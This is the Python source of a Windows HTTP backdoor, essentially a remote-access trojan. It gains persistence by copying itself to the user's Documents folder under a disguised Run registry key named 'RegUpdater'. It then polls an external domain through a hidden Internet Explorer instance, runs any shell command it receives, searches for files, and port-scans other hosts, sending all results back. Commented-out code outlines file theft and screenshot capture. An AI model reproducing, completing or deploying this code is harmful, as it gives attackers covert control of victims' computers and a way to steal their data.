import requests, subprocess, time, os, shutil, random, socket, sys, tempfile
import winreg as wreg
from PIL import ImageGrab
from win32com.client import Dispatch

def main():
    #recon phase to get current dir, username, and new copy path
    path = os.getcwd().strip('\n')
    Null, userprof = subprocess.check_output('set USERPROFILE', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).split('=')
    destination = userprof.strip('\n\r') + r'\Documents\http_backdoor.exe'

    #check for persistency
    if not os.path.exists(destination):
        shutil.copyfile(rf'{path}\http_backdoor.exe', destination)
        key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, r'Software\Microsoft\windows\CurrentVersion\Run', 0, wreg.KEY_SET_VALUE)
        wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, destination)
        key.Close()

    while True:
        try:
            ip = socket.gethostbyname('fourshells.serveminecraft.net')
            ip = f'http://{ip}'
            result = connect(ip)
            if result == 'connection error':
                raise Exception
            if result == 'interrupt':
                print('[-] Interrupt detected. Exiting...')
                break
            if result == 'kill':
                print('[-] Server has terminated connection. Exiting...')
                break
        except:
            sleep_for = random.randrange(1, 10)
            time.sleep(int(sleep_for))
            pass

def connect(ip):
    try:
        while True:
            ie = Dispatch("InternetExplorer.Application")
            ie.Visible = 0
            ie.Navigate(ip)
            while ie.ReadyState != 4:
                time.sleep(1)
            command = ie.Document.body.innerHTML

            if 'kill' in command:
                ie.Quit()
                return 'kill'
            
            elif 'grab' in command:
                '''
                TODO Below is the previous code for file transfer. Not functional currently.

                try:
                    grab, path = command.split('*')
                    if os.path.exists(path):
                        url = f'{ip}/store'
                        files = {'file': open(path, 'rb')}
                        send_via_IE(ip, ie, files)
                    else:
                        send_via_IE(ip, ie, '[-] Not able to extract file.')
                except Exception as e:
                    send_via_IE(ip, ie, f'[-] Not able to extract file.\n\n{e}')
                '''

            
            elif command.startswith('cd '):
                try:
                    changeDir = command.split(' ')[1]
                    os.chdir(changeDir)
                    send_via_IE(ip, ie, f'[+] Successfully changed directory to {os.getcwd()}')
                    continue
                except Exception as e:
                    send_via_IE(ip, ie, f'[-] Not able to change directory to {os.getcwd()}\\{changeDir}.\n{e}')
                    continue

            elif 'screencap' in command:
                '''
                TODO Below is the previous code for file transfer. Not functional currently.

                dirpath = tempfile.mkdtemp()
                ImageGrab.grab().save(dirpath + r'\img.jpg', 'JPEG')
                url = f'http://{ip}:8080/store'
                files = {'file':open(dirpath + r'\img.jpg', 'rb')}
                send_via_IE(ip, ie, files)

                files['file'].close()
                shutil.rmtree(dirpath)
                '''

            elif 'search' in command:
                command = command[7:]
                path, ext = command.split('*')
                lists = ''
                for dirpath, dirname, files in os.walk(path):
                    for file in files:
                        if file.endswith(ext):
                            lists = f'{lists}\n{os.path.join(dirpath, file)}'
                send_via_IE(ip, ie, lists)

            #syntax example: scan 10.10.0.1:22,80
            elif 'scan' in command:
                command = command[5:]
                tarIP, ports = command.split(':')
                scan_result = scanner(tarIP, ports)
                send_via_IE(ip, ie, scan_result)

            else:
                CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                send_via_IE(ip, ie, CMD.stdout.read())
                send_via_IE(ip, ie, CMD.stderr.read())
            time.sleep(3)

    except requests.exceptions.ConnectionError:
        return 'connection error'

    except KeyboardInterrupt:
        return 'interrupt'
    
def scanner(ip, ports):
    scan_result = ''
    if '-' in ports:
        range1, range2 = ports.split('-')
        port_range = range(int(range1), int(range2)+1)
        for port in port_range:
            try:
                sock = socket.socket()
                output = sock.connect_ex((ip, int(port)))
                if output == 0:
                    scan_result = f'{scan_result}[+] Port {port} is opened\n'
                else:
                    scan_result = f'{scan_result}[-] Port {port} is closed\n'
                    sock.close()
            except Exception:
                pass
            finally:
                sock.close()
        return scan_result

    if ',' in ports:    
        for port in ports.split(','):
            try:
                sock = socket.socket()
                output = sock.connect_ex((ip, int(port)))
                if output == 0:
                    scan_result = f'{scan_result}[+] Port {port} is opened\n'
                else:
                    scan_result = f'{scan_result}[-] Port {port} is closed\n'
                    sock.close()
            except Exception:
                pass
            finally:
                sock.close() 
        return scan_result

    return '[-] Improperly formatted port or port range.\nUsage: scan xxx.xxx.xxx.xxx:22,80\nOR\nxxx.xxx.xxx.xxx:20-80'

def send_via_IE(ip, ie, data):
        dURL = ip
        Flags = 0
        TargetFrame = 0
        if isinstance(data, str):
            PostData = memoryview(data.encode())
        else:
            message = '[-] Error with send_via_IE. Data to encode for memoryview is not Str.'
            PostData = memoryview(message.encode())
        ie.Navigate(dURL, Flags, TargetFrame, PostData)


if __name__ == '__main__':
    main()